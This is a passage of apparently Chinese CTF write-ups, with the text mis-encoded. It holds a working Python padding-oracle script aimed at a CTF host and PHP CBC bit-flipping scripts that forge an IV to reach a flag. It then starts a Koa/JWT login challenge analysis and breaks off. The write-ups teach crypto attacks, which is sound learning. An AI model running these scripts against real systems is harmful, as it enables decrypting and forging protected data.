<p><img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/image-20200422131849824.png" alt="image-20200422131849824"></p>
<p>æ­£å¥½æ˜¯åå…­ä¸ªå­—èŠ‚ï¼Œå¯ä»¥çŸ¥é“å®ƒçš„æ˜æ–‡å°±åªæœ‰ä¸€ä¸ªåˆ†ç»„ï¼Œç„¶åå°±æ”¹äº†æ”¹ç½‘ä¸Šçš„è„šæœ¬æ¥â€ç›²æ³¨â€œä¸­é—´å€¼ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">"http://ha1cyon-ctf.fun:30006/index.php?source=1&amp;method=decrypt"</span></span><br><span class="line">N = <span class="number">16</span></span><br><span class="line">proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>,<span class="string">"https"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re</span><span class="params">(iv)</span>:</span></span><br><span class="line">    data=&#123;<span class="string">"iv"</span>:iv,<span class="string">"data"</span>:<span class="string">"ly7auKVQCZWum/W/4osuPA=="</span>&#125;</span><br><span class="line">    result=requests.post(url,data=data,proxies=proxy)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(a[i])^ord(b[i%len(b)])) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(a))])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_oracle</span><span class="params">(N)</span>:</span></span><br><span class="line">    get=<span class="string">""</span><span class="comment">#ç”¨æ¥å­˜å‚¨ä¸­é—´å€¼</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,N+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">            padding=xor(get,chr(i)*(i<span class="number">-1</span>))<span class="comment">#æˆåŠŸæ³¨å‡ºä¸€ä½åè¦ä¿®æ”¹padding</span></span><br><span class="line">            c=chr(<span class="number">0</span>)*(<span class="number">16</span>-i)+chr(j)+padding</span><br><span class="line">            <span class="keyword">print</span> c.encode(<span class="string">'hex'</span>)</span><br><span class="line">            result=re(c)</span><br><span class="line">            <span class="keyword">print</span> result.content</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"php"</span>  <span class="keyword">in</span> result.content:</span><br><span class="line">                get=chr(j^i)+get</span><br><span class="line">                time.sleep(<span class="number">0.1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> get</span><br><span class="line">mid = padding_oracle(N)</span><br><span class="line"><span class="keyword">print</span> xor(mid,<span class="string">"6666666666666666"</span>)</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå¯ä»¥å¾—åˆ°$file1 ä¸º FlagIsHere.php</p>
<p>ç„¶åè®¿é—®FlagIsHere.phpï¼Œå¯ä»¥å¾—åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);    <span class="comment">//**************$file2********last step!!</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="string">"6666666"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_iv</span><span class="params">()</span></span>&#123;    <span class="comment">//ç”Ÿæˆéšæœºåˆå§‹å‘é‡IV</span></span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$lalala = <span class="string">'piapiapiapia'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'Identity'</span>]))&#123;</span><br><span class="line">    $_SESSION[<span class="string">'iv'</span>] = get_iv();</span><br><span class="line"></span><br><span class="line">    $_SESSION[<span class="string">'Identity'</span>] = base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION[<span class="string">'iv'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($_SESSION[<span class="string">'iv'</span>]).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">    $tmp_id = openssl_decrypt(base64_decode($_SESSION[<span class="string">'Identity'</span>]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST[<span class="string">'iv'</span>]));</span><br><span class="line">    <span class="keyword">echo</span> $tmp_id.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>($tmp_id ===<span class="string">'weber'</span>)<span class="keyword">die</span>($file2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¹Ÿæ˜¯å¼€å§‹åˆå§‹åŒ–äº†åŠ å¯†æ–¹å¼ aes-128-cbcã€å¯†é’¥ï¼ŒIVé€šè¿‡get_i()å‡½æ•°è·å¾—ï¼Œé»˜è®¤ä¼šæŠŠ<code>&#39;piapiapiapia&#39;</code>åŠ å¯†ï¼Œå¹¶å°†å¯†æ–‡å’ŒIVä¿å­˜åœ¨SESSIONä¸­ï¼Œä¼šæ‰“å°å‡ºIVå€¼ï¼Œç„¶åå¯ä»¥é€šè¿‡æˆ‘ä»¬è¾“å…¥çš„ivå€¼ä½œä¸ºIVå¯¹SESSIONä¸­ä¿å­˜çš„å¯†æ–‡è¿›è¡Œè§£å¯†ï¼Œè‹¥è§£å¯†åä¸ºâ€˜weberâ€™ï¼Œåˆ™ä¼šè¾“å‡º$file2ï¼Œè¿™é‡Œå°±å¯ä»¥é€šè¿‡cdcç¿»è½¬æ¥å°†æ˜æ–‡æ”¹å˜æˆweberã€‚</p>
<p>ä¸‹é¢é™„ä¸Šè„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$enc = base64_decode(<span class="string">"EjD+vzcXcP9n4iamEmdNMQ=="</span>);</span><br><span class="line">$old = <span class="string">"piapiapiapia"</span> . urldecode(<span class="string">"%04%04%04%04"</span>);</span><br><span class="line">$tar = <span class="string">"weber"</span> . urldecode(<span class="string">"%0b%0b%0b%0b%0b%0b%0b%0b%0b%0b%0b"</span>);</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++) &#123;</span><br><span class="line">	$enc[$i] = chr(ord($enc[$i]) ^ ord($old[$i]) ^ ord($tar[$i]));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($enc);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//FTz9qix9C50NmUTMHWhCPg==</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå°†å¾—åˆ°çš„IVä¼ ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨ä¼šå›æ˜¾</p>
<p><img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/image-20200422135128872.png" alt="image-20200422135128872"></p>
<p>ç„¶åè®¿é—®/HelloWorld.7zå¯ä»¥å¾—åˆ°ä¸€ä¸ªjavaçš„classæ–‡ä»¶ï¼Œæ”¾åˆ°jd-guiä¸­å¯ä»¥å¾—åˆ°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] paramArrayOfString)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">");</span></span><br><span class="line"><span class="string">    byte[] arrayOfByte = &#123; </span></span><br><span class="line"><span class="string">        102, 108, 97, 103, 123, 119, 101, 54, 95, 52, </span></span><br><span class="line"><span class="string">        111, 103, 95, 49, 115, 95, 101, 52, 115, 121, </span></span><br><span class="line"><span class="string">        103, 48, 105, 110, 103, 125 &#125;;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯ä»¥çœ‹å‡ºæ•°ç»„ä¸ºflagçš„asciiç ï¼Œç„¶åè§£ç å°±å¯ä»¥ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">54</span>, <span class="number">95</span>, <span class="number">52</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">52</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">125</span> ]</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	flag += chr(i)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘åšé¢˜æ˜¯é‡åˆ°ä¸€ä¸ªå‘ç‚¹ï¼Œç¬¬ä¸€æ¬¡æˆ‘æ˜¯åˆ©ç”¨ä¸‹é¢çš„è„šæœ¬ç”Ÿæˆçš„IVï¼Œæäº¤æ—¶å‘ç°è¿‡ä¸å»éªŒè¯ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$enc = base64_decode(<span class="string">"EjD+vzcXcP9n4iamEmdNMQ=="</span>);</span><br><span class="line">$old = <span class="string">"piapiapiapia"</span>; <span class="comment">//. urldecode("%04%04%04%04");</span></span><br><span class="line">$tar = <span class="string">"weber"</span> . urldecode(<span class="string">"%00%00%00%00%00%00%00"</span>); <span class="comment">//%00%00%00%00");</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">12</span>; $i++) &#123;</span><br><span class="line">	$enc[$i] = chr(ord($enc[$i]) ^ ord($old[$i]) ^ ord($tar[$i]));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($enc);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">FTz9qix2AJYGkk/HEmdNMQ==</span><br></pre></td></tr></table></figure>

<p>åœ¨æœ¬åœ°å¤ç°å‘ç°è¿™æ ·å¾—åˆ°çš„å­—ç¬¦ä¸²åœ¨æµè§ˆå™¨æ˜¾ç¤ºç¡®å®ä¸º<code>weber</code>,ä½†æ˜¯ç”¨var_dump()è¾“å‡ºä¸€ä¸‹å¯ä»¥çœ‹å‡º</p>
<p><img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/image-20200422135611513.png" alt="image-20200422135611513"></p>
<p>è¿™ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ä¸º12ï¼Œæ‰€ä»¥ä¸<code>weber</code>å¼ºç­‰äºæ˜¯é€šè¿‡ä¸äº†çš„ï¼Œæ‰€ä»¥è¦ç”Ÿæˆé•¿åº¦ä¸º5çš„<code>weber</code>å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æ­£ç¡®çš„è„šæœ¬åº”è¯¥æ˜¯è¿™æ ·çš„ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$enc = base64_decode(<span class="string">"EjD+vzcXcP9n4iamEmdNMQ=="</span>);</span><br><span class="line">$old = <span class="string">"piapiapiapia"</span> . urldecode(<span class="string">"%04%04%04%04"</span>);</span><br><span class="line">$tar = <span class="string">"weber"</span> . urldecode(<span class="string">"%0b%0b%0b%0b%0b%0b%0b%0b%0b%0b%0b"</span>);</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++) &#123;</span><br><span class="line">	$enc[$i] = chr(ord($enc[$i]) ^ ord($old[$i]) ^ ord($tar[$i]));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($enc);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å‚è€ƒé“¾æ¥</p>
<p><a href="https://www.freebuf.com/articles/database/151167.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/database/151167.html</a></p>
<p><a href="https://www.smi1e.top/cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E5%92%8Cpadding-oracle/#padding_oracle" target="_blank" rel="noopener"><a href="https://www.smi1e.top/cbcå­—èŠ‚ç¿»è½¬æ”»å‡»å’Œpadding-oracle/#padding_oracle" target="_blank" rel="noopener">https://www.smi1e.top/cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E5%92%8Cpadding-oracle/#padding_oracle</a></a></p>
]]></content>
      <tags>
        <tag>Padding oracle</tag>
        <tag>CBCç¿»è½¬</tag>
      </tags>
  </entry>
  <entry>
    <title>2020æ•°å­—ä¸­å›½åˆ›æ–°å¤§é“è™ç¬¦ç½‘ç»œå®‰å…¨èµ›é“Webé¢˜è§£</title>
    <url>/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>2020æ•°å­—ä¸­å›½åˆ›æ–°å¤§é“è™ç¬¦ç½‘ç»œå®‰å…¨èµ›é“Webé¢˜è§£</p>
<a id="more"></a>

<h1 id="0x01-easy-login"><a href="#0x01-easy-login" class="headerlink" title="0x01 easy_login"></a>0x01 easy_login</h1><p>å¯ä»¥æ‰«åˆ°æºç ï¼Œçœ‹åˆ°æ˜¯Koaæ¡†æ¶ï¼Œç„¶åæœäº†ä¸‹æ¡†æ¶ç›¸å…³çš„çŸ¥è¯†ï¼Œ<a href="https://blog.csdn.net/davidPan1234/article/details/83413958" target="_blank" rel="noopener">çœ‹åˆ°è¿™ç¯‡</a></p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419192757519.png" alt="image-20200419192757519"></p>
<p>ç„¶åè®¿é—®å¯ä»¥å¾—åˆ°æºç ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//app.js</span></span><br><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'koa-bodyparser'</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'koa-session'</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> = <span class="built_in">require</span>(<span class="string">'koa-static'</span>);</span><br><span class="line"><span class="keyword">const</span> views = <span class="built_in">require</span>(<span class="string">'koa-views'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; resolve &#125; = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rest = <span class="built_in">require</span>(<span class="string">'./rest'</span>);</span><br><span class="line"><span class="keyword">const</span> controller = <span class="built_in">require</span>(<span class="string">'./controller'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">80</span>;</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"></span><br><span class="line">app.keys = [crypto.randomBytes(<span class="number">16</span>).toString(<span class="string">'hex'</span>)];</span><br><span class="line">global.secrets = [];</span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">static</span>(resolve(__dirname, <span class="string">'.'</span>)));</span><br><span class="line"></span><br><span class="line">app.use(views(resolve(__dirname, <span class="string">'./views'</span>), &#123;</span><br><span class="line">  extension: <span class="string">'pug'</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.use(session(&#123;<span class="attr">key</span>: <span class="string">'sses:aok'</span>, <span class="attr">maxAge</span>: <span class="number">86400000</span>&#125;, app));</span><br><span class="line"></span><br><span class="line"><span class="comment">// parse request body:</span></span><br><span class="line">app.use(bodyParser());</span><br><span class="line"></span><br><span class="line"><span class="comment">// prepare restful service</span></span><br><span class="line">app.use(rest.restify());</span><br><span class="line"></span><br><span class="line"><span class="comment">// add controllers:</span></span><br><span class="line">app.use(controller());</span><br><span class="line"></span><br><span class="line">app.listen(PORT);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`app started at port <span class="subst">$&#123;PORT&#125;</span>...`</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//controller.js</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addMapping</span>(<span class="params">router, mapping</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> url <span class="keyword">in</span> mapping) &#123;</span><br><span class="line">        <span class="keyword">if</span> (url.startsWith(<span class="string">'GET '</span>)) &#123;</span><br><span class="line">            <span class="keyword">const</span> path = url.substring(<span class="number">4</span>);</span><br><span class="line">            router.get(path, mapping[url]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url.startsWith(<span class="string">'POST '</span>)) &#123;</span><br><span class="line">            <span class="keyword">const</span> path = url.substring(<span class="number">5</span>);</span><br><span class="line">            router.post(path, mapping[url]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`invalid URL: <span class="subst">$&#123;url&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addControllers</span>(<span class="params">router, dir</span>) </span>&#123;</span><br><span class="line">    fs.readdirSync(__dirname + <span class="string">'/'</span> + dir).filter(<span class="function"><span class="params">f</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> f.endsWith(<span class="string">'.js'</span>);</span><br><span class="line">    &#125;).forEach(<span class="function"><span class="params">f</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> mapping = <span class="built_in">require</span>(__dirname + <span class="string">'/'</span> + dir + <span class="string">'/'</span> + f);</span><br><span class="line">        addMapping(router, mapping);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">dir</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> controllers_dir = dir || <span class="string">'controllers'</span>;</span><br><span class="line">    <span class="keyword">const</span> router = <span class="built_in">require</span>(<span class="string">'koa-router'</span>)();</span><br><span class="line">    addControllers(router, controllers_dir);</span><br><span class="line">    <span class="keyword">return</span> router.routes();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//rest.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    APIError: <span class="function"><span class="keyword">function</span> (<span class="params">code, message</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.code = code || <span class="string">'internal:unknown_error'</span>;</span><br><span class="line">        <span class="keyword">this</span>.message = message || <span class="string">''</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    restify: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> pathPrefix = <span class="string">'/api/'</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (ctx.request.path.startsWith(pathPrefix)) &#123;</span><br><span class="line">                ctx.rest = <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">                    ctx.response.type = <span class="string">'application/json'</span>;</span><br><span class="line">                    ctx.response.body = data;</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">await</span> next();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                    ctx.response.status = <span class="number">400</span>;</span><br><span class="line">                    ctx.response.type = <span class="string">'application/json'</span>;</span><br><span class="line">                    ctx.response.body = &#123;</span><br><span class="line">                        code: e.code || <span class="string">'internal_error'</span>,</span><br><span class="line">                        message: e.message || <span class="string">''</span></span><br><span class="line">                    &#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">await</span> next();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//controller/api.js</span></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">'jsonwebtoken'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> APIError = <span class="built_in">require</span>(<span class="string">'../rest'</span>).APIError;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="string">'POST /api/register'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'register error'</span>, <span class="string">'wrong username'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(global.secrets.length &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">            global.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">'hex'</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = global.secrets.length;</span><br><span class="line">        global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br><span class="line">        </span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line">    </span><br><span class="line">    <span class="string">'POST /api/login'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'username or password is necessary'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">'.'</span>)[<span class="number">1</span>], <span class="string">'base64'</span>).toString()).secretid;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'no such secret id'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'GET /api/flag'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(ctx.session.username !== <span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'permission error'</span>, <span class="string">'permission denied'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.readFileSync(<span class="string">'/flag'</span>).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'GET /api/logout'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = <span class="literal">null</span>;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æœ‰æ³¨å†Œå’Œç™»å½•çš„åŠŸèƒ½ï¼Œ</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419174209067.png" alt="image-20200419174209067"></p>
<p>ä¸å¯ä»¥æ³¨å†Œadminï¼Œéšæœºç”Ÿæˆå¯†é’¥ï¼Œå¹¶å°†å¯†é’¥æŒ‰åºä¿å­˜åˆ°å…¨å±€secretsæ•°ç»„ä¸­ï¼Œåˆ©ç”¨jwt.signæ¥ç”Ÿæˆsecretid, username, passwordçš„tokenã€‚</p>
